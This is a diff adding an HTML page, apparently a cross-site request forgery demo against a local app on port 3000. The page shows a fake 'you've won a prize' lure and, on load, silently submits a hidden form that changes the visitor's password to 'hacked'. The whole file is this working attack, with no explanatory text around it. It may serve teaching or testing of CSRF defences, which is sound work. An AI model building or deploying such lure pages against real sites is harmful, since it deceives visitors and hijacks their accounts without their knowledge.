@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Totally Innocent Page</title>
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body onload="document.getElementById('csrf-form').submit()">
+    <div class="container">
+      <h1>Congratulations! You've won a prize!</h1>
+      <p>Your prize is being processed...</p>
+
+      <form
+        id="csrf-form"
+        style="display: none"
+        action="http://localhost:3000/change-password"
+        method="POST"
+      >
+        <input type="hidden" name="newpassword" value="hacked" />
+      </form>
+    </div>
+  </body>
+</html>
